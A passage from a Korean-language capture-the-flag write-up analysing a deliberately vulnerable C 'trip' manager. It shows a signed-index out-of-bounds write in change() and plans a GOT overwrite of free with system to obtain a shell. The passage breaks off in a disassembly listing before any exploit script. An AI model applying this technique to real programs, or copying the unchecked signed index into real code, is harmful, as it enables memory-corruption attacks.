punctuation\">;</span>\n\t<span class=\"token keyword\">int</span> choice_num<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>tIndex <span class=\"token operator\">==</span> TRIPS_NUM<span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">{</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Cannot add more trips.\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Adding new trips...\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\ttrip <span class=\"token operator\">*</span>newTrip <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>trip<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Choose a Distance: \\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"1. 0x80 \\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"2. 0x110 \\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"3. 0x128 \\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"4. 0x150 \\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"5. 0x200 \\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"> \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">fgets</span><span class=\"token punctuation\">(</span>choice<span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">stdin</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\tchoice_num <span class=\"token operator\">=</span> <span class=\"token function\">atoi</span><span class=\"token punctuation\">(</span>choice<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span>choice_num<span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">case</span> <span class=\"token number\">1</span><span class=\"token operator\">:</span>\n\t\tnewTrip<span class=\"token operator\">-></span>distance <span class=\"token operator\">=</span> <span class=\"token function\">strtoul</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"0x80\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\tnewTrip<span class=\"token operator\">-></span>destination <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span>newTrip<span class=\"token operator\">-></span>distance<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Destination: \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">fgets</span><span class=\"token punctuation\">(</span>newTrip<span class=\"token operator\">-></span>destination<span class=\"token punctuation\">,</span> newTrip<span class=\"token operator\">-></span>distance<span class=\"token punctuation\">,</span> <span class=\"token constant\">stdin</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">case</span> <span class=\"token number\">2</span><span class=\"token operator\">:</span>\n\t\tnewTrip<span class=\"token operator\">-></span>distance <span class=\"token operator\">=</span> <span class=\"token function\">strtoul</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"0x110\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\tnewTrip<span class=\"token operator\">-></span>destination <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span>newTrip<span class=\"token operator\">-></span>distance<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Destination: \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">fgets</span><span class=\"token punctuation\">(</span>newTrip<span class=\"token operator\">-></span>destination<span class=\"token punctuation\">,</span> newTrip<span class=\"token operator\">-></span>distance<span class=\"token punctuation\">,</span> <span class=\"token constant\">stdin</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">case</span> <span class=\"token number\">3</span><span class=\"token operator\">:</span>\n\t\tnewTrip<span class=\"token operator\">-></span>distance <span class=\"token operator\">=</span> <span class=\"token function\">strtoul</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"0x128\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\tnewTrip<span class=\"token operator\">-></span>destination <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span>newTrip<span class=\"token operator\">-></span>distance<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Destination: \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">fgets</span><span class=\"token punctuation\">(</span>newTrip<span class=\"token operator\">-></span>destination<span class=\"token punctuation\">,</span> newTrip<span class=\"token operator\">-></span>distance<span class=\"token punctuation\">,</span> <span class=\"token constant\">stdin</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">case</span> <span class=\"token number\">4</span><span class=\"token operator\">:</span>\n\t\tnewTrip<span class=\"token operator\">-></span>distance <span class=\"token operator\">=</span> <span class=\"token function\">strtoul</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"0x150\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\tnewTrip<span class=\"token operator\">-></span>destination <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span>newTrip<span class=\"token operator\">-></span>distance<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Destination: \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">fgets</span><span class=\"token punctuation\">(</span>newTrip<span class=\"token operator\">-></span>destination<span class=\"token punctuation\">,</span> newTrip<span class=\"token operator\">-></span>distance<span class=\"token punctuation\">,</span> <span class=\"token constant\">stdin</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">case</span> <span class=\"token number\">5</span><span class=\"token operator\">:</span>\n\t\tnewTrip<span class=\"token operator\">-></span>distance <span class=\"token operator\">=</span> <span class=\"token function\">strtoul</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"0x200\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\tnewTrip<span class=\"token operator\">-></span>destination <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span>newTrip<span class=\"token operator\">-></span>distance<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Destination: \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">fgets</span><span class=\"token punctuation\">(</span>newTrip<span class=\"token operator\">-></span>destination<span class=\"token punctuation\">,</span> newTrip<span class=\"token operator\">-></span>distance<span class=\"token punctuation\">,</span> <span class=\"token constant\">stdin</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">default</span><span class=\"token operator\">:</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Can't you count?\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Trip %lu added.\\n\"</span><span class=\"token punctuation\">,</span> tIndex<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\ttrips<span class=\"token punctuation\">[</span>tIndex<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> newTrip<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>add func &#x3C;1:0x80, 2:0x110, 3:0x128, 4:0x150, 5:0x200></li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token operator\">-></span> choice<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span>\n<span class=\"token operator\">-></span> tIndex <span class=\"token operator\">==</span> <span class=\"token number\">7</span> <span class=\"token operator\">-></span> <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> tcache<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n<span class=\"token operator\">-></span> trip <span class=\"token operator\">*</span>newTrip <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>trip<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></code></pre></div>\n<ul>\n<li>size를 선택해서 그 사이즈를 통해 동적 할당</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">case</span> <span class=\"token number\">1</span><span class=\"token operator\">~</span><span class=\"token number\">5</span>\nnewTrip<span class=\"token operator\">-></span>distance <span class=\"token operator\">=</span> <span class=\"token operator\">&lt;</span><span class=\"token number\">1</span><span class=\"token operator\">~</span><span class=\"token number\">5</span><span class=\"token operator\">></span>\nnewTrip<span class=\"token operator\">-></span>destination <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span>newTrip<span class=\"token operator\">-></span>distance<span class=\"token punctuation\">)</span>\nnewTrip<span class=\"token operator\">-></span>destination <span class=\"token operator\">&lt;</span><span class=\"token operator\">-</span> size<span class=\"token operator\">-</span><span class=\"token number\">1</span> 만큼 데이터 입력 <span class=\"token punctuation\">(</span><span class=\"token constant\">stdin</span><span class=\"token punctuation\">)</span></code></pre></div>\n<ul>\n<li>add func 마지막 tIndex 증가 배열 설정한 구조체 대입 <code class=\"language-text\">[tIndex++] = newTrip</code></li>\n</ul>\n<h2 id=\"change-함수\" style=\"position:relative;\"><a href=\"#change-%ED%95%A8%EC%88%98\" aria-label=\"change 함수 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>change 함수</h2>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">void</span> <span class=\"token function\">change</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Update trip: \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">char</span> buf<span class=\"token punctuation\">[</span><span class=\"token number\">20</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">fgets</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">,</span> <span class=\"token number\">20</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">stdin</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\tssize_t choice <span class=\"token operator\">=</span> <span class=\"token function\">strtoul</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>choice <span class=\"token operator\">>=</span> tIndex<span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">{</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"No upcoming trip to update.\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">}</span>\n\ttrip <span class=\"token operator\">*</span>oldTrip <span class=\"token operator\">=</span> trips<span class=\"token punctuation\">[</span>choice<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n\tssize_t bytes_read <span class=\"token operator\">=</span> <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> oldTrip<span class=\"token operator\">-></span>destination<span class=\"token punctuation\">,</span> oldTrip<span class=\"token operator\">-></span>distance<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\toldTrip<span class=\"token operator\">-></span>destination<span class=\"token punctuation\">[</span>bytes_read<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>할당되어진 구조체의 destination 부분을 변경할 수 있으며 tIndex 부분을 사용자가 직접 입력하여 trips 구조체의 주소 부분에 접근이 가능하다.</li>\n<li>choice 가 tIndex보다 클경우 함수를 종료하는 제어 문이 존재 하지만 해당 함수에서는 취약한 점이 존재한다.</li>\n<li><code class=\"language-text\">ssize_t</code> 데이터 타입은 signed 이기 때문에 음수를 처리할 수 있다 그렇다면 해당 조건 문에서 음수를 입력 하게 된다면 우회가 가능하고 <code class=\"language-text\">trips</code> 구조체 주소 번지를 계산 할 때 음수 값으로 인해 다른 메모리로 접근이 가능하다.</li>\n<li>그렇다면 이러한 interger issue 로 인하여 특정 메모리 밖의 주소에 접근하여 원하는 값으로 변경이 가능하다.</li>\n</ul>\n<h2 id=\"delete-함수\" style=\"position:relative;\"><a href=\"#delete-%ED%95%A8%EC%88%98\" aria-label=\"delete 함수 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>delete 함수</h2>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">void</span> <span class=\"token function\">delet</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Which trip you want to delete: \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">char</span> buf<span class=\"token punctuation\">[</span><span class=\"token number\">20</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">fgets</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">,</span> <span class=\"token number\">20</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">stdin</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\tssize_t i <span class=\"token operator\">=</span> <span class=\"token function\">strtoul</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">>=</span> tIndex<span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">{</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"That trip is not there already.\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">}</span>\n\ttrip <span class=\"token operator\">*</span>tp <span class=\"token operator\">=</span> trips<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>tIndex <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">{</span>\n\t\ttrips<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> trips<span class=\"token punctuation\">[</span>tIndex <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t\ttIndex <span class=\"token operator\">=</span> tIndex <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">}</span>\n\n\t<span class=\"token function\">free</span><span class=\"token punctuation\">(</span>tp<span class=\"token operator\">-></span>destination<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">free</span><span class=\"token punctuation\">(</span>tp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>해제시 사용하던 값을 복사한 후 tIndex를 감소하여 삭제하려는 인덱스 범웨에 대입 즉, 마지막 주소 범웨에 있던 값을 해제시 해당 영역에 대입 후 Tindex 감소</li>\n</ul>\n<h2 id=\"gettrip-함수\" style=\"position:relative;\"><a href=\"#gettrip-%ED%95%A8%EC%88%98\" aria-label=\"gettrip 함수 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>getTrip 함수</h2>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">void</span> <span class=\"token function\">getTrip</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Which trip you want to view? \\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\">\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">char</span> choice<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">fgets</span><span class=\"token punctuation\">(</span>choice<span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">stdin</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\tssize_t i <span class=\"token operator\">=</span> <span class=\"token function\">strtoul</span><span class=\"token punctuation\">(</span>choice<span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">>=</span> tIndex<span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">{</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"No trip in here. \\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">}</span>\n\ttrip <span class=\"token operator\">*</span>aTrip <span class=\"token operator\">=</span> trips<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s \\n\"</span><span class=\"token punctuation\">,</span> aTrip<span class=\"token operator\">-></span>destination<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>trips 구조체의 destination 멤버 를 출력하는 형식이다.</li>\n</ul>\n<h1 id=\"해결-방안\" style=\"position:relative;\"><a href=\"#%ED%95%B4%EA%B2%B0-%EB%B0%A9%EC%95%88\" aria-label=\"해결 방안 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>해결 방안</h1>\n<h2 id=\"exploit-idea\" style=\"position:relative;\"><a href=\"#exploit-idea\" aria-label=\"exploit idea permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Exploit Idea</h2>\n<ul>\n<li>change 함수에서 Integer issue를 바탕으로 어떤 메모리를 덮을 수 있을까? 동적 메모리를 할당하고 해제하는 해당 바이너리에서 free의 got 부분을 조작하여 system@got로 변경할 수있다면 delete 함수를 호출하여 내부적으로 동작하면서 system 함수가 호출되어 쉴을 획득할 수 있을 것이다.</li>\n</ul>\n<h2 id=\"freeplt6\" style=\"position:relative;\"><a href=\"#freeplt6\" aria-label=\"freeplt6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>free@plt+6</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 16.11111111111111%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAoElEQVQI1x3JWw6CMBAAQA4iBijdhS0tD4EFsRSK0agxhvtfxoTPyQSbu8+3pV+37bez83qc2K5U8UlQnOapQAEksiJBdRYYyTwGimQWJjJMIFien2m557Y3buiGEd6unmfFb+QXt+yBuO4e390/PmSadrSD9f00gyqxqIKO9LVlZz03fW0aXbVkLqhKPDpCFQFJVWa6Rl2JTMvcwEFQ5R/E9SLORF49mwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./0.png\"\n        title=\"./0.png\"\n        src=\"/static/f58f69fc7363dba6e8f2bdd6d9ac8541/37523/0.png\"\n        srcset=\"/static/f58f69fc7363dba6e8f2bdd6d9ac8541/e9ff0/0.png 180w,\n/static/f58f69fc7363dba6e8f2bdd6d9ac8541/f21e7/0.png 360w,\n/static/f58f69fc7363dba6e8f2bdd6d9ac8541/37523/0.png 720w,\n/static/f58f69fc7363dba6e8f2bdd6d9ac8541/715a3/0.png 830w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token number\">0x400c59</span> <span class=\"token operator\">&lt;</span>change<span class=\"token operator\">+</span><span class=\"token number\">99</span><span class=\"token operator\">></span>     mov    rax<span class=\"token punctuation\">,</span> qword ptr <span class=\"token punctuation\">[</span>rbp <span class=\"token operator\">-</span> <span class=\"token number\">8</span><span class=\"token punctuation\">]</span>\n<span class=\"token number\">0x400c5d</span> <span class=\"token 